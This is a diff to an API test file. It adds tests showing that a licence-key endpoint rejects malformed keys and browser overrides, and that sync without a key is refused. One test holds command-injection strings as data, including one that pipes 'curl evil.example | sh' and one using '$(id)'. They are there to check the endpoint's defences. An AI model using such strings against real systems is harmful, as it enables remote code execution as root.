@@ -304,3 +304,46 @@ test("rollback refuses when there is nowhere to go back to", async () => {
   expect(res.status).toBe(409);
   expect(res.status).not.toBe(202);
 });
+
+/**
+ * Entering a licence key from the app. The value reaches a root command line
+ * on the customer's own server, so what this endpoint refuses matters more
+ * than what it accepts.
+ */
+test("a malformed licence key is refused before it is stored", async () => {
+  for (const evil of [
+    'SENT-AAAA-BBBB-CCCC-DDDD"; curl evil.example | sh',
+    "SENT-AAAA-BBBB-CCCC-$(id)",
+    "not-a-key",
+    "",
+  ]) {
+    const res = await app.request("http://localhost/api/settings/license", {
+      method: "POST",
+      headers,
+      body: JSON.stringify({ key: evil }),
+    });
+    expect(res.status).toBe(400);
+  }
+});
+
+test("a key set on the server is not replaced from a browser", async () => {
+  process.env.SENTRELLO_LICENSE_KEY = "SENT-AAAA-BBBB-CCCC-DDDD";
+  const res = await app.request("http://localhost/api/settings/license", {
+    method: "POST",
+    headers,
+    body: JSON.stringify({ key: "SENT-4QGE-M9EP-PRTX-ZGWY" }),
+  });
+  process.env.SENTRELLO_LICENSE_KEY = "";
+  // The server is the more privileged of the two places a key can live.
+  expect(res.status).toBe(409);
+});
+
+test("syncing without a licence key says so rather than pretending", async () => {
+  const res = await app.request("http://localhost/api/settings/sync", {
+    method: "POST",
+    headers,
+    body: "{}",
+  });
+  expect(res.status).toBe(409);
+  expect(res.status).not.toBe(202);
+});
